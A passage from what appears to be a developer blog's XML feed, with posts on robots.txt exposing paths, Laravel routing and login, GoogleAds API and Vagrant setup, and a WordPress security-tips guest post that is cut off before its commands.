class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: Slurp</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: teoma</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: Yeti</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/ajax/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /album.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/checkpoint/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /contact_importer/</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/feeds/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /file_download.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/hashtag/</span></span><br><span class="line"><span class="symbol">Disallow:</span> /l.php</span><br><span class="line"><span class="symbol">Disallow:</span> /p.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photo.php</span><br><span class="line"><span class="symbol">Disallow:</span> /photos.php</span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/sharer/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="keyword">/topic/</span></span><br><span class="line"></span><br><span class="line">User-agent: ia_archiver</span><br><span class="line"><span class="symbol">Allow:</span> <span class="keyword">/about/</span>privacy</span><br><span class="line"><span class="symbol">Allow:</span> /full_data_use_policy</span><br><span class="line"><span class="symbol">Allow:</span> <span class="keyword">/legal/</span>terms</span><br><span class="line"><span class="symbol">Allow:</span> /policy.php</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line"><span class="symbol">Disallow:</span> /</span><br></pre></td></tr></table></figure><p>So the hacker may try to access in this way, e.g. <em><a href="http://www.facebook.com/topic/">www.facebook.com/topic/</a></em> <em>(I have tried it, it shows page not available)</em>.</p><h3 id="How-to-prevent-this"><a href="#How-to-prevent-this" class="headerlink" title="How to prevent this?"></a>How to prevent this?</h3><p>You can choose a modern web framework to develop your web application, example like <a href="http://laravel.com/">Laravel</a>, the <a href="http://laravel.com/docs/5.1/routing">path</a> is you can specify it by your own, e.g.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;foo/bar&#x27;</span>, function () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>When hacker try to look for <em><a href="http://www.yoursite.com/foo">www.yoursite.com/foo</a></em>, he/she won’t get anything here. So becareful when you design your web application.</p><h2 id="Update-4-Apr-2018"><a href="#Update-4-Apr-2018" class="headerlink" title="Update: 4 Apr 2018"></a>Update: 4 Apr 2018</h2><p>You may <a href="https://www.websiteplanet.com/webtools/robots-txt">check your robots.txt here</a>.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://www.robotstxt.org/&quot;&gt;Robots.txt&lt;/a&gt; designed to prevent search engine to crawl your page or content, some of the content</summary>
        
      
    
    
    
    
    <category term="security" scheme="http://jslim.net/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Make use of Laravel 5 default login</title>
    <link href="http://jslim.net/blog/2015/11/12/make-use-of-laravel-5-default-login/"/>
    <id>http://jslim.net/blog/2015/11/12/make-use-of-laravel-5-default-login/</id>
    <published>2015-11-12T06:02:46.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>If you see the default <strong>AuthController.php</strong>, you can actually see this <code>use AuthenticatesAndRegistersUsers</code>.<br>They called this as <em><a href="http://php.net/manual/en/language.oop5.traits.php">traits</a></em>, which was introduced in PHP 5.4.0</p><p>By using their default login, you have to create your own <em>view</em>, e.g.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;form-signin&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    &#123;!! csrf_field() !!&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-lg btn-primary&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>In the <strong>app/Http/Controllers/Auth/AuthController.php</strong>, you can specify your <em>username</em> in the table<br><em>(some of people will use <strong>email</strong> instead)</em>. The <code>$redirectPath</code> is refer to after you successful<br>login, where should it redirect to?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$redirectPath</span> = <span class="string">&#x27;/dashboard&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;username&#x27;</span>;</span><br></pre></td></tr></table></figure><p>As my example, I actually move the model class to a <strong>Models</strong> folder, thus I need to change this</p><p><strong>config/auth.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="string">&#x27;model&#x27;</span> =&gt; <span class="title class_">App\Models\User</span>::<span class="variable language_">class</span>, <span class="comment">// &lt;------- change this</span></span><br></pre></td></tr></table></figure><p>If you want to change the login error message, originally is <em>“These credentials do not match our records.”</em></p><p>Then you can edit <strong>resources/lang/en/auth.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="string">&#x27;failed&#x27;</span> =&gt; <span class="string">&#x27;Your custom error message&#x27;</span>,</span><br></pre></td></tr></table></figure><p>Basically is done now. Try it yourself…</p><p>References:</p><ul><li><a href="https://stackoverflow.com/questions/28516454/laravel-5-user-model-not-found/28516582#28516582">Laravel 5 User Model not found</a></li><li><a href="https://laracasts.com/discuss/channels/general-discussion/log-in-with-username-or-email-in-laravel-5">Log in with username or email in Laravel 5…</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;If you see the default &lt;strong&gt;AuthController.php&lt;/strong&gt;, you can actually see this &lt;code&gt;use</summary>
        
      
    
    
    
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
  </entry>
  
  <entry>
    <title>Integrate GoogleAds API to Laravel 5</title>
    <link href="http://jslim.net/blog/2015/11/05/integrate-googleads-api-to-laravel-5/"/>
    <id>http://jslim.net/blog/2015/11/05/integrate-googleads-api-to-laravel-5/</id>
    <published>2015-11-05T04:02:46.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>This may be too simple for you.<br>At the beginning, I was thinking like how the PSR works, what class should I add to <strong>config/app.php</strong>‘s provider <em>(actually no need)</em>, etc.</p><p>Eventually I realised that, it was quite simple.</p><h3 id="1-Edit-the-composer-json"><a href="#1-Edit-the-composer-json" class="headerlink" title="1. Edit the composer.json"></a>1. Edit the <code>composer.json</code></h3><p>Add <code>&quot;googleads/googleads-php-lib&quot;: &quot;6.*&quot;</code> to the <strong>require</strong> section.</p><p>e.g.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.5.9&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;laravel/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;googleads/googleads-php-lib&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6.*&quot;</span>   &lt;----------- this line</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Then run the command:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>composer update</span><br></pre></td></tr></table></figure><h3 id="2-Create-config-file"><a href="#2-Create-config-file" class="headerlink" title="2. Create config file"></a>2. Create config file</h3><p>By follow <a href="http://laravel.com/docs/5.1/packages">Laravel 5 standard</a>, create a config file in the <strong>config</strong> folder</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">project</span><br><span class="line">├── config</span><br><span class="line">│   ├── googleleads</span><br><span class="line">│       └── adwords.ini</span><br></pre></td></tr></table></figure><p>The <strong>adwords.ini</strong> contains:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; Detailed descriptions of these properties can be found at:</span></span><br><span class="line"><span class="comment">; https://developers.google.com/adwords/api/docs/headers</span></span><br><span class="line"></span><br><span class="line"><span class="attr">developerToken</span> = <span class="string">&quot;INSERT_DEVELOPER_TOKEN_HERE&quot;</span></span><br><span class="line"><span class="attr">userAgent</span> = <span class="string">&quot;INSERT_COMPANY_NAME_HERE&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Uncomment clientCustomerId to make requests against a single AdWords account,</span></span><br><span class="line"><span class="comment">; such as when you run the examples.</span></span><br><span class="line"><span class="comment">; If you don&#x27;t set it here, you can set the client customer ID dynamically:</span></span><br><span class="line"><span class="comment">;  $user = new AdWordsUser();</span></span><br><span class="line"><span class="comment">;  $user-&gt;SetClientCustomerId(...);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; clientCustomerId = &quot;INSERT_CLIENT_CUSTOMER_ID_HERE&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[OAUTH2]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; If you do not have a client ID or secret, please create one of type</span></span><br><span class="line"><span class="comment">; &quot;installed application&quot; in the Google API console:</span></span><br><span class="line"><span class="comment">; https://cloud.google.com/console</span></span><br><span class="line"><span class="attr">client_id</span> = <span class="string">&quot;INSERT_OAUTH2_CLIENT_ID_HERE&quot;</span></span><br><span class="line"><span class="attr">client_secret</span> = <span class="string">&quot;INSERT_OAUTH2_CLIENT_SECRET_HERE&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; If you already have a refresh token, enter it below. Otherwise run</span></span><br><span class="line"><span class="comment">; GetRefreshToken.php.</span></span><br><span class="line"><span class="attr">refresh_token</span> = <span class="string">&quot;INSERT_OAUTH2_REFRESH_TOKEN_HERE&quot;</span></span><br></pre></td></tr></table></figure><h3 id="3-How-to-use"><a href="#3-How-to-use" class="headerlink" title="3. How to use"></a>3. How to use</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;adwords&#x27;</span>, function () &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">AdWordsUser</span>(<span class="title function_ invoke__">config_path</span>(<span class="string">&#x27;googleads/adwords.ini&#x27;</span>));</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$user</span>); <span class="comment">// for debug only</span></span><br><span class="line">    <span class="comment">// other actions here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;adwords&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>That’s all~</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;This may be too simple for you.&lt;br&gt;At the beginning, I was thinking like how the PSR works, what class should I add to</summary>
        
      
    
    
    
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="google-api" scheme="http://jslim.net/tags/google-api/"/>
    
  </entry>
  
  <entry>
    <title>Vagrant for PHP development environment</title>
    <link href="http://jslim.net/blog/2015/10/31/vagrant-for-php-development-environment/"/>
    <id>http://jslim.net/blog/2015/10/31/vagrant-for-php-development-environment/</id>
    <published>2015-10-31T04:02:46.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="What-is-Vagrant"><a href="#What-is-Vagrant" class="headerlink" title="What is Vagrant?"></a>What is Vagrant?</h2><p>I asked this question before, I think is about 1 year+ ago. Many times, I search for it, but couldn’t understand how it work.</p><p>Until recently, I found that Laravel also recommended it. I tried and eventually I found it really useful!</p><h2 id="Configure-now"><a href="#Configure-now" class="headerlink" title="Configure now"></a>Configure now</h2><p>First of all, you will need a <strong>ssh key</strong>, <a href="https://www.vagrantup.com/">Vagrant</a> &amp; <a href="https://www.virtualbox.org/">VirtualBox</a>.</p><p>Generate ssh key</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -<span class="keyword">b</span> <span class="number">4096</span> -C <span class="string">&quot;username@example.com&quot;</span></span><br></pre></td></tr></table></figure><p>Navigate to your development folder, e.g. <code>cd ~/dev</code></p><p>Clone the Laravel configuration for Vagrant <em>(we’re refering to Laravel’s vagrant file)</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vagrant box add laravel/homestead</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/laravel/homestead.git homestead</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> homestead</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pre configure</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sh init.sh</span></span><br></pre></td></tr></table></figure><p>Assuming that all projects are hosted on the same VM.</p><p>The configuration files stored in <code>~/.homestead</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/.homestead/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim Homestead.yaml</span></span><br></pre></td></tr></table></figure><p>Edit the file <strong>Homestead.yaml</strong>, refer to <a href="http://laravel.com/docs/5.1/homestead">Laravel doc</a> for complete information.</p><p>There are few things you need to change</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">folders:</span></span><br><span class="line">    - map: ~<span class="keyword">/dev/</span>web</span><br><span class="line"><span class="symbol">      to:</span> <span class="keyword">/home/</span>vagrant/dev</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">sites:</span></span><br><span class="line">    - map: laravel.homestead.com</span><br><span class="line"><span class="symbol">      to:</span> <span class="keyword">/home/</span>vagrant<span class="keyword">/dev/</span>laravel/public</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">databases:</span></span><br><span class="line">    - laravel</span><br></pre></td></tr></table></figure><p>Just an example here, look at the section <strong>folders</strong>, it actually created a shared folder in the VM. <code>~/dev/web</code> is the local folder which keep all the web project <em>(make sure it exists before you run <code>vagrant up</code>)</em>, whereas the <code>/home/vagrant/dev</code> will be inside the VM</p><p>For <strong>sites</strong>, is actually the virtual hosts for a particular project, in this example is to map <code>laravel.homestead.com</code> to the project named <code>laravel</code></p><p>Now you can create the VM</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/dev/homestead</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vagrant up</span></span><br></pre></td></tr></table></figure><p>Now edit your <strong>/etc/hosts</strong> file, by adding the following line</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.10.10</span>  laravel.homestead.com</span><br></pre></td></tr></table></figure><p><em>(the ip address was in your <strong>~/.homestead/Homestead.yaml</strong>)</em></p><p>Create a new laravel project <em>(if you don’t know how to install laravel, refer <a href="http://laravel.com/docs/5.0">http://laravel.com/docs/5.0</a>)</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/dev/web</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">laravel new laravel</span></span><br></pre></td></tr></table></figure><p>Now open up your browser, and type in the address <a href="http://laravel.homestead.com/">laravel.homestead.com</a>, and you will see the page!</p><p>You can remain your development in the host OS, but host the project in VM.</p><p>You can actually verify this by <strong>open a new terminal</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/dev/homestead</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vagrant ssh</span></span><br></pre></td></tr></table></figure><p>Now you logged in to the VM</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/dev</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -l</span></span><br><span class="line">drwxr-xr-x 1 vagrant vagrant  816 Oct 21 08:55 laravel/</span><br></pre></td></tr></table></figure><p>Go back to the previous terminal, create a dummy file</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ touch ~<span class="regexp">/dev/</span>web/<span class="keyword">new</span>-<span class="keyword">file</span></span><br></pre></td></tr></table></figure><p>Switch back to the second terminal</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ll</span><br><span class="line">drwxr-xr-x<span class="number"> 1 </span>vagrant vagrant <span class="number"> 816 </span>Oct<span class="number"> 21 </span>08:55 laravel/</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>vagrant vagrant <span class="number"> 816 </span>Oct<span class="number"> 21 </span>08:57 new-file</span><br></pre></td></tr></table></figure><p>Means now you can create any other PHP projects beside Laravel in this environment as you like.</p><p>Enjoy yourself :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;What-is-Vagrant&quot;&gt;&lt;a href=&quot;#What-is-Vagrant&quot; class=&quot;headerlink&quot; title=&quot;What is Vagrant?&quot;&gt;&lt;/a&gt;What is Vagrant?&lt;/h2&gt;&lt;p&gt;I asked this</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="vagrant" scheme="http://jslim.net/tags/vagrant/"/>
    
  </entry>
  
  <entry>
    <title>Top 5 Strategies to Heighten Security of Your WordPress Site</title>
    <link href="http://jslim.net/blog/2015/10/30/top-5-strategies-to-heighten-security-of-your-wordpress-site/"/>
    <id>http://jslim.net/blog/2015/10/30/top-5-strategies-to-heighten-security-of-your-wordpress-site/</id>
    <published>2015-10-30T08:01:09.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Author-Bio"><a href="#Author-Bio" class="headerlink" title="Author Bio :"></a>Author Bio :</h2><p>Sophia is a renowned WordPress developer by profession. If you’re about to <a href="http://www.wordprax.com/services/hire-wordpress-developers">Hire WordPress developer</a>, then you can get in touch with her. Sophia already has multiple WordPress-related articles under her name.</p><p>Despite investing a significant amount of time and efforts, your WordPress website may still be vulnerable to attacks. In fact, on an average nearly 20,000 sites are identified as hacked every day. Unfortunately, you won’t find any “One size Fits All” approach that can help make a WordPress website secure from getting hacked. But, there are a few simple to follow strategies that can help harden your WordPress site security. In this post, I’ve listed 5 simple yet crucial strategies that will safeguard your site against potential threats.</p><h3 id="1-Limit-The-Use-Of-the-Term-“WordPress”-On-Your-Site"><a href="#1-Limit-The-Use-Of-the-Term-“WordPress”-On-Your-Site" class="headerlink" title="1. Limit The Use Of the Term “WordPress” On Your Site"></a>1. Limit The Use Of the Term “WordPress” On Your Site</h3><p>While having a WordPress site can help establish your business as a strong online identity, the irony is that very mention of the terminology “WordPress” on your site can put it at risk. That’s because, the immense popularity of the WordPress CMS makes it a favorite target for hackers. Malicious users can launch brute force attacks, if they’ll identify the WordPress version you’re running, or the WP theme or plugins you have installed. Of course, you can completely avoid using the term WordPress on your website, but try to limit its use.</p><p>You can deal with such an issue by changing some default permalinks of your WordPress site. Doing so, will help keep your site safe against brute force attacks, SQL-injection and other attacks.</p><h3 id="2-Don’t-Forget-to-Change-Default-Administrator-Name"><a href="#2-Don’t-Forget-to-Change-Default-Administrator-Name" class="headerlink" title="2. Don’t Forget to Change Default Administrator Name"></a>2. Don’t Forget to Change Default Administrator Name</h3><p><img src="/images/posts/2015-10-31-top-5-strategies-to-heighten-security-of-your-wordpress-site/password.png" alt="Strong password"></p><p>One common mistake that site owners tend to make is that they overlook or forget to change the default username (i.e. admin) for their WordPress account. Keep in mind that not changing the administrator name makes the brute force successful, as hackers just need to guess your password to break into your site admin interface.</p><p>You just need to create a new admin user for changing your website default user name. Once you’ve created a new admin user account, make sure to delete the original default admin user from your admin panel.</p><h3 id="3-Use-an-Updated-WordPress-Version"><a href="#3-Use-an-Updated-WordPress-Version" class="headerlink" title="3. Use an Updated WordPress Version"></a>3. Use an Updated WordPress Version</h3><p><img src="/images/posts/2015-10-31-top-5-strategies-to-heighten-security-of-your-wordpress-site/updated.jpg" alt="Updated version of WordPress"></p><p>Each new WordPress release comes with several new and improved features. More importantly, the latest version boasts security fixes to resolve bugs found in previous WP version. Thus, running your site on an up-to-date WordPress version will not just help add many more features, but will also help fix security loopholes and issues.</p><p>For example, in order to keep WordPress sites secure the latest WordPress version 4.3 has introduced a new approach for generating secure passwords. When using this new version, you won’t be receiving passwords through email instead you will be getting a password reset link. The best part is that WordPress will automatically create a password for every new user profile.</p><h3 id="4-Correct-File-Permissions-is-Crucial-For-Website-Security"><a href="#4-Correct-File-Permissions-is-Crucial-For-Website-Security" class="headerlink" title="4. Correct File Permissions is Crucial For Website Security"></a>4. Correct File Permissions is Crucial For Website Security</h3><p>Not using the correct right permissions for your website files and directories can impose a threat to your website security. Wondering why? As you may know, you can write on your WordPress site from the server. This often creates a problem when your site runs on a shared server. Such kind of server hosts multiple sites, and thus there is a greater possibility that your files can be accessed by some other site owner. You won’t face any problem if your file permission allows users to read it. However, avoid assigning write permission on your file, or some malicious user may write faulty code, making it vulnerable to attacks.</p><p>With the following commands, you can protect all your WordPress files and folders safe and accessible only to authenticated users:</p><figure class="highlight 